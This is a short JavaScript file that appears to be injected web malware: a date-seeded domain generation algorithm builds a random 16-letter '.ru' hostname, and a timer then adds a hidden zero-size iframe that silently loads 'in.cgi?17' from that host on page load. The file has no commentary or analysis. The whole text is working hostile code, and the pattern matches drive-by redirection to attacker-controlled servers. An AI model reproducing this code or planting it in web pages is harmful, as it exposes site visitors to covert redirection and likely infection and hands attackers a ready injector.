function nextRandomNumber() {
    var hi = this.seed / this.Q;
    var lo = this.seed % this.Q;
    var test = this.A * lo - this.R * hi;
    if (test > 0) {
        this.seed = test;
    } else {
        this.seed = test + this.M;
    }
    return (this.seed * this.oneOverM);
}

function RandomNumberGenerator(unix) {
    var d = new Date(unix * 1000);
    var s = Math.ceil(d.getHours() / 3);
    this.seed = 2345678901 + (d.getMonth() * 0xFFFFFF) + (d.getDate() * 0xFFFF) + (Math.round(s * 0xFFF));
    this.A = 48271;
    this.M = 2147483647;
    this.Q = this.M / this.A;
    this.R = this.M % this.A;
    this.oneOverM = 1.0 / this.M;
    this.next = nextRandomNumber;
    return this;
}

function createRandomNumber(r, Min, Max) {
    return Math.round((Max - Min) * r.next() + Min);
}

function generatePseudoRandomString(unix, length, zone) {
    var rand = new RandomNumberGenerator(unix);
    var letters = "qmahgwctopfjilrfpjrfcwgewheizwdw".split('');
    var str = '';
    for (var i = 0; i < length; i++) {
        str += letters[createRandomNumber(rand, 0, letters.length - 1)];
    }
    return str + '.' + zone;
}
setInterval(function() {
    try {
        if (typeof iframeWasCreated == "undefined") {
            var unix = Math.round(+new Date() / 1000);
            var domainName = generatePseudoRandomString(unix, 16, 'ru');
            ifrm = document.createElement("IFRAME");
            ifrm.setAttribute("src", "http://" + domainName + "/in.cgi?17");
            ifrm.style.width = "0px";
            ifrm.style.height = "0px";
            ifrm.style.visibility = "hidden";
            document.body.appendChild(ifrm);
            iframeWasCreated = true;
        }
    } catch (e) {
        iframeWasCreated = undefined;
    }
}, 100);
